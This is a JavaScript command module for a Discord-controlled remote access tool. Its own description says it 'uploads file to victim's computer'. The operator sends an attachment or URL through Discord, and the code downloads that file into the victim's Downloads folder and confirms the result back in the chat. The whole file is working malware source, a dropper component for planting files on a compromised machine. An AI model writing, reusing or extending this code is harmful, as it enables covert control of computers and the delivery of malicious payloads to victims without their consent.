const { SlashCommandBuilder, escapeMarkdown } = require('discord.js');
const axios = require('axios');
const { createWriteStream } = require('fs');
const path = require('path');
const os = require('os');

module.exports = {
  data: new SlashCommandBuilder()
    .setName('upload')
    .setDescription('Uploads file to victim\'s computer')
    .addAttachmentOption(option => option
      .setName('file')
      .setDescription('The file to upload')
    )
    .addStringOption(option => option
      .setName('url')
      .setDescription('The file to upload')
    )
    .addStringOption(option => option
      .setName('filename')
      .setDescription('Filename of the file to upload')
    )
    .setDMPermission(false),

  async run(interaction, client, args) {
    const slash = !!interaction.options;
    const fileUrl = slash ?
      interaction.options.getAttachment('file')?.url ?? interaction.options.getString('url') :
      interaction.attachments.size > 0 ?
        interaction.attachments.first()?.url :
        args[0];

    if (!fileUrl) {
      return interaction.reply({
        content: 'File or URL is required.', ephemeral: true
      });
    }
    const filename = (slash ? args.getString('filename') : args[1]) ?? path.basename(fileUrl).split('?')[0];

    if (slash) await interaction.deferReply();
    try {
      const { data } = await axios.get(fileUrl, { responseType: 'stream' });
      const filePath = path.join(os.homedir(), 'Downloads', filename);

      try {
        data.pipe(createWriteStream(filePath)).on('finish', async () => {
          await interaction[slash ? 'editReply' : 'reply']({
            content: `Uploaded the file to \`${filePath}\`.`
          });
        });
      } catch (e) {
        await interaction[slash ? 'editReply' : 'reply']({
          content: `Failed to upload: ${e.message}`, ephemeral: true
        });
      }
    } catch (e) {
      await interaction[slash ? 'editReply' : 'reply']({
        content: `Failed to fetch URL: ${e.message}`, ephemeral: true
      });
    }
  }
}
